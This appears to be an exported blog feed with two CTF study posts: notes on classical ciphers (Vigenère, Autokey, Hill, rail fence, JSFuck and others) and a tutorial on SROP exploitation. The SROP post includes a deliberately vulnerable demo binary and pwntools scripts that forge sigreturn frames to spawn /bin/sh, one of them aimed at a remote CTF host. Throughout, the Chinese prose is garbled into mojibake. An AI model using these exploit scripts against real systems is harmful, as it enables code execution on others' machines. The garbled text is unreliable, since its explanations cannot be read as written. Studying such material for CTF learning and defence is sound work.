ç”±äºç»´å‰å°¼äºšå¯†ç å±äºå¤šè¡¨åŠ å¯†ï¼Œæ‰€ä»¥ä¸€ä¸ªå­—æ¯å¯èƒ½è¢«åŠ å¯†æˆä¸åŒçš„å¯†æ–‡ï¼Œç”±äºå¯†é’¥æ˜¯é‡å¤ä½¿ç”¨çš„ï¼Œæ‰€ä»¥åªè¦çŸ¥é“äº†å¯†é’¥çš„é•¿åº¦ï¼Œå°±å¯ä»¥å°†å…¶çœ‹æˆæ˜¯äº¤ç»‡åœ¨ä¸€èµ·çš„å‡¯æ’’å¯†ç ï¼Œæ¯ä¸€ä¸ªéƒ½å¯ä»¥å•ç‹¬ç ´è§£ã€‚å¯†é’¥é•¿åº¦å¯ä»¥ä½¿ç”¨å¡è¥¿æ–¯åŸºè¯•éªŒæ¥å¾—åˆ°ã€‚</p>
<p><img src="http://static.zybuluo.com/hgggg/er0k0mqmiaxoeo4ktiw98ioc/1587018-20191126194722022-992570273.jpg" alt="1587018-20191126194722022-992570273.jpg-207.2kB"></p>
<pre><code>Autokeyä¸ç»´å‰å°¼äºšå¯†ç å¯†ç ç±»ä¼¼ï¼Œè‡ªåŠ¨å¯†é’¥å¯†ç ï¼ˆAutokeyï¼‰ä¸»è¦æœ‰ä¸¤ç§ï¼Œå…³é”®è¯è‡ªåŠ¨å¯†é’¥å¯†ç å’ŒåŸæ–‡è‡ªåŠ¨å¯†é’¥å¯†ç ã€‚æ‰€ä»¥å®ƒæ¯”ç»´å‰å°¼äºšæ›´åŠ å®‰å…¨ã€‚ä¸‹é¢æˆ‘ä»¬ä»¥å…³é”®è¯è‡ªåŠ¨å¯†é’¥ä¸ºä¾‹ï¼š
æ˜æ–‡ï¼šTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG
å…³é”®è¯ï¼šCULTURE
è‡ªåŠ¨ç”Ÿæˆå¯†é’¥ï¼šCULTURE THE QUICK BROWN FOX JUMPS OVER THE
å¯†æ–‡ï¼šVBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK
</code></pre>
<h3 id="4-3å¸Œå°”å¯†ç "><a class="header-anchor" href="#4-3å¸Œå°”å¯†ç ">Â¶</a>4.3å¸Œå°”å¯†ç </h3>
<pre><code>å¸Œå°”å¯†ç ï¼ˆHillï¼‰ä½¿ç”¨æ¯ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­çš„é¡ºåºä½œä¸ºå…¶å¯¹åº”çš„æ•°å­—ï¼Œå³A=0ï¼ŒB=1ï¼ŒC=2 ç­‰ï¼Œç„¶åå°†æ˜æ–‡è½¬åŒ–ä¸º n ç»´å‘é‡ï¼Œè·Ÿä¸€ä¸ª n Ã— n çš„çŸ©é˜µç›¸ä¹˜ï¼Œå†å°†å¾—å‡ºçš„ç»“æœæ¨¡ 26ã€‚åŠ å¯†çŸ©é˜µå¿…é¡»æ˜¯å¯é€†çš„ï¼Œå¦åˆ™å°±ä¸å¯èƒ½è§£ç ã€‚åªæœ‰çŸ©é˜µçš„è¡Œåˆ—å¼å’Œ 26 äº’è´¨ï¼Œæ‰æ˜¯å¯é€†çš„ã€‚
</code></pre>
<p>åŠ å¯†ï¼š<br>
<img src="http://static.zybuluo.com/hgggg/geep66492gw4cd9jwo6yamm1/123456%20%285%29.png" alt="123456 (5).png-68.1kB"><br>
è§£å¯†ï¼š<br>
æ±‚å‡ºåŠ å¯†çŸ©é˜µçš„é€†çŸ©é˜µç„¶ååŒå¯†æ–‡ç›¸ä¹˜åå†å¯¹ç­‰åˆ°çš„çŸ©é˜µæ¨¡26(äººæ‡’å°±ä¸ä¸Šå›¾äº†)</p>
<h2 id="5-å…¶ä»–å¯†ç "><a class="header-anchor" href="#5-å…¶ä»–å¯†ç ">Â¶</a>5.å…¶ä»–å¯†ç </h2>
<h4 id="åŸ¹æ ¹å¯†ç ï¼š"><a class="header-anchor" href="#åŸ¹æ ¹å¯†ç ï¼š">Â¶</a>åŸ¹æ ¹å¯†ç ï¼š</h4>
<p><img src="http://static.zybuluo.com/hgggg/7alys7nj2040f01lc4mmbzj7/123456.png" alt="123456.png-19.2kB"></p>
<h4 id="æ …æ å¯†ç ï¼š"><a class="header-anchor" href="#æ …æ å¯†ç ï¼š">Â¶</a>æ …æ å¯†ç ï¼š</h4>
<pre><code>æ‰€è°“æ …æ å¯†ç ï¼Œå°±æ˜¯æŠŠè¦åŠ å¯†çš„æ˜æ–‡åˆ†æˆNä¸ªä¸€ç»„ï¼Œç„¶åæŠŠæ¯ç»„çš„ç¬¬1ä¸ªå­—è¿èµ·æ¥ï¼Œå½¢æˆä¸€æ®µæ— è§„å¾‹çš„è¯ã€‚
</code></pre>
<h4 id="JSFuck"><a class="header-anchor" href="#JSFuck">Â¶</a>JSFuck:</h4>
<p>å½¢å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br><span class="line">åŸä½œè€…github:https://github.com/aemkei/jsfuck</span><br></pre></td></tr></table></figure>
<h4 id="BrainFuck"><a class="header-anchor" href="#BrainFuck">Â¶</a>BrainFuck</h4>
<pre><code>ä¸€ç§æå°ä¼—çš„è®¡ç®—æœºè¯­è¨€ï¼Œç”±â€œ&gt;ã€&lt;ã€+ã€-ã€.ã€,ã€[ã€]&quot;å…«ä¸ªç¬¦å·ç»„æˆã€‚è¯¥è¯­è¨€ç”±ç›®å‰æœ‰ä¸“é—¨çš„è§£é‡Šå™¨ï¼Œæ„Ÿå…´è¶£å¯ä»¥è‡ªè¡Œäº†è§£ã€‚
</code></pre>
<h4 id="çŒªåœˆåŠå…¶å˜å½¢"><a class="header-anchor" href="#çŒªåœˆåŠå…¶å˜å½¢">Â¶</a>çŒªåœˆåŠå…¶å˜å½¢</h4>
<pre><code>çŒªåœˆå¯†ç ï¼ˆäº¦ç§°æœ±é«˜å¯†ç ã€å…±æµä¼šæš—å·ã€å…±æµä¼šå¯†ç æˆ–å…±æµä¼šå‘˜å¯†ç ï¼‰ï¼Œæ˜¯ä¸€ç§ä»¥æ ¼å­ä¸ºåŸºç¡€çš„ç®€å•æ›¿ä»£å¼å¯†ç ã€‚å³ä½¿ä½¿ç”¨ç¬¦å·ï¼Œä¹Ÿä¸ä¼šå½±å“å¯†ç åˆ†æï¼Œäº¦å¯ç”¨åœ¨å…¶å®ƒæ›¿ä»£å¼çš„æ–¹æ³•ã€‚
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/j5ds8cf7kr3ivkob7dbyhniv/123456.jpg" alt="123456.jpg-26.6kB"></p>
<h4 id="è·³èˆçš„å°äºº"><a class="header-anchor" href="#è·³èˆçš„å°äºº">Â¶</a>è·³èˆçš„å°äºº</h4>
<pre><code>å‡ºè‡ªã€Šç¦å°”æ‘©æ–¯ã€‹çš„å¯†ç 
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/g6nj57kk1444l2zizplrhla0/123456%20%282%29.jpg" alt="123456 (2).jpg-23.3kB"></p>
<h4 id="æ¥è‡ªå®‡å®™çš„ä¿¡å·"><a class="header-anchor" href="#æ¥è‡ªå®‡å®™çš„ä¿¡å·">Â¶</a>æ¥è‡ªå®‡å®™çš„ä¿¡å·</h4>
<p><img src="http://static.zybuluo.com/hgggg/9rbnfvwqapog0zs4at0bqzuw/20180310123813709.png" alt="20180310123813709.png-92.4kB"></p>
<h4 id="å¤ç²¾çµç "><a class="header-anchor" href="#å¤ç²¾çµç ">Â¶</a>å¤ç²¾çµç </h4>
<p><img src="http://static.zybuluo.com/hgggg/zrn18wxlgf7gi88475gs61ni/55409313b07eca805f84325b982397dda044835e.jpg" alt="55409313b07eca805f84325b982397dda044835e.jpg-29.3kB"></p>
<pre><code>é™¤äº†ä»¥ä¸Šåˆ—å‡ºæ¥çš„è¿™äº›ï¼Œè¿˜æœ‰ç›²æ–‡ã€æ•°å­—ç›²æ–‡ã€éŸ³ç¬¦åŠ å¯†ã€01248ã€ä¸ä½›è®ºç¦…ç­‰ä¹Ÿæ›¾å‡ºç°åœ¨CTFæ¯”èµ›ä¸­ã€‚
</code></pre>
<h3 id="6-å¸¸ç”¨ç½‘ç«™"><a class="header-anchor" href="#6-å¸¸ç”¨ç½‘ç«™">Â¶</a>6.å¸¸ç”¨ç½‘ç«™</h3>
<pre><code>http://ctf.ssleye.com/#
https://quipqiup.com/
</code></pre>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>cryptoç¬”è®°</tag>
        <tag>å¤å…¸å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title>SROP</title>
    <url>/2021/11/19/SROP/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/39.jpg" alt="pic"><br><span id="more"></span></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>SROP(Sigreturn Oriented Programming)è¿™ç§åˆ©ç”¨æ–¹æ³•ç»å¸¸ä¼šç”¨åœ¨bypassä¸€äº›æ²™ç›’ä¿æŠ¤æˆ–è€…æ˜¯ä¸€äº›é«˜ç‰ˆæœ¬çš„glibcçš„åˆ©ç”¨æ–¹å¼å¦‚house of pig ,house of banana ç­‰ï¼Œæ˜¯å¾ˆå¤šåˆ©ç”¨æ–¹å¼çš„ä¸€ä¸ªå‰ç½®æŠ€èƒ½ï¼Œæ•…ç‰¹åœ°æ¥å­¦ä¹ ä¸‹ã€‚</p>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ä¸‹å›¾æ˜¯å½“Linux/Unixæ“ä½œç³»ç»Ÿä¸­ä¸€ä¸ªè¿›ç¨‹ä»æ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·ï¼ˆsignalï¼‰åˆ°æ¢å¤è¿›ç¨‹æ‰§è¡Œæ‰€ç»å†çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚<br><img src="https://gitee.com/Nss-harukii/images/raw/master/123.png" alt="pic"></p>
<p>Step1: ç”¨æˆ·å±‚æ¥æ”¶åˆ°ä¸€ä¸ªsignal  </p>
<p>Step2: å†…æ ¸å±‚ä¼šä¿å­˜å½“å‰è¿›ç¨‹çš„ä¸Šä¸‹æ–‡å³sigFrameï¼ˆå³å¯„å­˜å™¨çš„çŠ¶æ€ï¼‰åˆ°æ ˆä¸Šï¼Œç„¶åè¢«å†…æ ¸æŒ‚èµ·ã€‚æ­¤æ—¶sigFrameé¡¶éƒ¨çš„å…«/å››ä¸ªå­—èŠ‚ä¼šè¢«è®¾ç½®ä¸ºrt_sigreturn,rt_sigreturnå¤„çš„å†…å®¹æŒ‡å‘sigreturnç³»ç»Ÿè°ƒç”¨ä»£ç ã€‚</p>
<p>Step3: ç”¨æˆ·å±‚çš„Signal Handleå°†ä¼šå¯¹æ¥å—åˆ°çš„signalåšä¸€ä¸ªå¤„ç†ï¼Œå¤„ç†ç»“æŸåä¼šå°†æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘rt_sigreturnã€‚</p>
<p>Step4: sigreturnç³»ç»Ÿè°ƒç”¨æœ€ç»ˆä¼šæ ¹æ®SigFrameä¸­çš„æ•°æ®å°†ä¸Šä¸‹æ–‡æ¢å¤</p>
<p>Step5: ç»§ç»­æ‰§è¡Œè¿›ç¨‹</p>
<p><strong>é‚£ä¹ˆæˆ‘ä»¬çš„æ”»å‡»æ€è·¯å°±å¾ˆæ˜¾è€Œæ˜“è§äº†ï¼Œå¦‚æœæˆ‘ä»¬åœ¨sigreturnæ¢å¤è¿›ç¨‹ä¸Šä¸‹æ–‡ä¹‹å‰å°±å°†SigFrameä¸­çš„æ•°æ®ç¯¡æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œå°±èƒ½æ§åˆ¶å¯„å­˜å™¨æ¥åŠ«æŒç¨‹åºæ‰§è¡Œæµ</strong></p>
<p>Step4ä¸­sigreturnæ¢å¤ä¸Šä¸‹æ–‡çš„æ“ä½œå…¶å®æ˜¯æ ¹æ®ucontext_tç»“æ„ä½“æ¥æ¢å¤ï¼Œucontextç»“æ„ä½“å†…å®¹å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags; <span class="comment">// 0-8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span> <span class="comment">// 8-16</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// 16-40 the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// 40-296 the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;     <span class="comment">// 40-48</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;     <span class="comment">// 48-56</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;    <span class="comment">// 56-64</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;    <span class="comment">// 64-72</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;    <span class="comment">// 72-80</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;    <span class="comment">// 80-88</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;    <span class="comment">// 88-96</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;    <span class="comment">// 96-104</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;    <span class="comment">// 104-112</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;    <span class="comment">// 112-120</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;    <span class="comment">// 120-128</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;    <span class="comment">// 128-136</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;    <span class="comment">// 136-144</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;    <span class="comment">// 144-152</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;    <span class="comment">// 152-160</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;    <span class="comment">// 160-168</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;    <span class="comment">// 168-176</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>è€ŒSROPå…¶å®å°±æ˜¯ä¼ªé€ ucontext_tç»“æ„ä½“ï¼Œè€Œåœ¨pwntoolsä¸­å·²ç»é›†æˆäº†ç›¸å…³çš„æ–¹æ³•</p>
<p>å…·ä½“æ„é€ æ–¹æ³•è§ï¼š<a href="http://docs.pwntools.com/en/stable/rop/srop.html?highlight=srop">http://docs.pwntools.com/en/stable/rop/srop.html?highlight=srop</a> </p>
<h2 id="Demo-æ‘˜è‡ªEXå¸ˆå‚…çš„åšå®¢"><a href="#Demo-æ‘˜è‡ªEXå¸ˆå‚…çš„åšå®¢" class="headerlink" title="Demo(æ‘˜è‡ªEXå¸ˆå‚…çš„åšå®¢)"></a>Demo(æ‘˜è‡ª<a href="http://blog.eonew.cn/archives/975">EXå¸ˆå‚…çš„åšå®¢</a>)</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compiled: </span></span><br><span class="line"><span class="comment">// gcc -g -c -fno-stack-protector srop.c -o srop.o</span></span><br><span class="line"><span class="comment">// ld -e main srop.o -o srop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> global_buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="comment">// è¯»å–æœ€å¤š 200 å­—èŠ‚</span></span><br><span class="line">        <span class="string">&quot;mov $0, %%rax\n&quot;</span> <span class="comment">// sys_read</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;mov $0, %%rdi\n&quot;</span> <span class="comment">// fd</span></span><br><span class="line">        <span class="string">&quot;lea %0, %%rsi\n&quot;</span> <span class="comment">// buf</span></span><br><span class="line">        <span class="string">&quot;mov $0x200, %%rdx\n&quot;</span> <span class="comment">// count</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span></span><br><span class="line">        <span class="comment">// è¯»å–å­—èŠ‚æ•°å°äº ucontext_tç»“æ„ä½“åˆ™ç›´æ¥ exit</span></span><br><span class="line">        <span class="string">&quot;cmp $0xf8, %%rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;jb exit\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿›è¡Œæ¢å¤ä¸Šä¸‹æ–‡</span></span><br><span class="line">        <span class="string">&quot;mov $0, %%rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rsi, %%rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $15, %%rax\n&quot;</span> <span class="comment">// sys_rt_sigaction</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span></span><br><span class="line">        <span class="string">&quot;jmp exit\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* split */</span></span><br><span class="line">        <span class="string">&quot;nop\n&quot;</span></span><br><span class="line">        <span class="string">&quot;nop\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// syscall çš„ symbolï¼Œä¾¿äºæŸ¥æ‰¾</span></span><br><span class="line">        <span class="string">&quot;syscall:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span> </span><br><span class="line">        <span class="string">&quot;jmp exit\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€€å‡ºç¨‹åº</span></span><br><span class="line">        <span class="string">&quot;exit:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $60, %%rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $0, %%rsi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span>         </span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;m&quot;</span> (global_buf)</span><br><span class="line">        : </span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆè°ƒè¯•æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;pid&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">str_bin_sh_offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating a custom frame</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = elf.symbols[<span class="string">&#x27;global_buf&#x27;</span>] + str_bin_sh_offset</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">sh.send(<span class="built_in">bytes</span>(frame).ljust(str_bin_sh_offset, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤è°ƒè¯•æ–‡ä»¶</span></span><br><span class="line">os.system(<span class="string">&quot;rm -f pid&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="åˆ—é¢˜"><a href="#åˆ—é¢˜" class="headerlink" title="åˆ—é¢˜"></a>åˆ—é¢˜</h2><h3 id="CISCN-2019åå—-PWN3"><a href="#CISCN-2019åå—-PWN3" class="headerlink" title="[CISCN 2019åå—]PWN3"></a>[CISCN 2019åå—]PWN3</h3><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>vulnå‡½æ•°ä¸­å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä¸”readå’Œwriteå‡½æ•°éƒ½æ˜¯é€šè¿‡syscallæ¥è°ƒç”¨çš„ï¼ŒåŒæ—¶writeä¼šæ‰“å°å‡ºä¸€ä¸ªæ ˆåœ°å€</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/1.png" alt="pic"></p>
<p>åŒæ—¶é¢˜ç›®è¿˜ç»™åˆ°ä¸€ä¸ªgadget<br><img src="https://gitee.com/Nss-harukii/images/raw/master/P9D.png" alt="pic"></p>
<p>è¿™é¢˜ç›®çš„ç”¨æ„å°±å¾ˆæ˜æ˜¾äº†ï¼Œâ€œmov rax 0x0fâ€,è€Œsigreturnçš„ç³»ç»Ÿè°ƒç”¨å·å°±æ­£å¥½æ˜¯15å·ï¼Œé¢˜ç›®ä¸­ä¹Ÿç»™å‡ºäº†â€œsyscall ret â€è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨sigreturnï¼Œé€šè¿‡ä¼ªé€ SigFrameæ¥æ§åˆ¶å¯„å­˜å™¨ï¼Œ/bin/shçš„åœ°å€æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¹‹å‰æ‰“å°å‡ºæ¥çš„æ ˆåœ°å€å‡å»åç§»æ¥è®¡ç®—ã€‚</p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;ciscn_s_3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28101</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_s_3&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">syscall_15 = <span class="number">0x0000000004004DA</span></span><br><span class="line">syscall = <span class="number">0x000000000400517</span> </span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(main))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">bin_sh = stack_addr - <span class="number">0x138</span></span><br><span class="line">farme = SigreturnFrame()</span><br><span class="line">farme.rax = <span class="number">59</span></span><br><span class="line">farme.rdi = bin_sh</span><br><span class="line">farme.rip = syscall</span><br><span class="line">farme.rsi = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(syscall_15)+p64(syscall)+<span class="built_in">bytes</span>(farme)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
